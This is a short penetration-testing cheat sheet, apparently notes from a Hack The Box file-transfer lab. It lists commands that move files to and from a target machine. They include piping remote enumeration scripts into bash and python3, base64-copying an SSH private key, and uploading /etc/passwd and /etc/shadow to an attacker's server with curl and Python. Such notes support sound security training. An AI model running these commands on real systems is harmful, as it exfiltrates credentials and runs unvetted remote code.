## Download Operations

```
Base64 Encoding/Decoding
# Encode the content on kali
cat id_rsa |base64 -w 0;echo

# Decode the File on target
echo -n 'LS0tLS1CRUdJTi...' | base64 -d > id_rsa
```
```
Web Downloads with Wget and cURL
# Using curl
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Using wget
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
```
Download with Bash (/dev/tcp)
# Connect to the Target Webserver
TomTank05@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

# HTTP GET Request
TomTank05@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Print the Response
TomTank05@htb[/htb]$ cat <&3
```

SSH Downloads

## Upload Operations
```
Web Upload
# Pwnbox - Start Web Server
sudo python3 -m pip install --user uploadserver

# Pwnbox - Start Web Server with self-signed Certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload Multiple Files
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
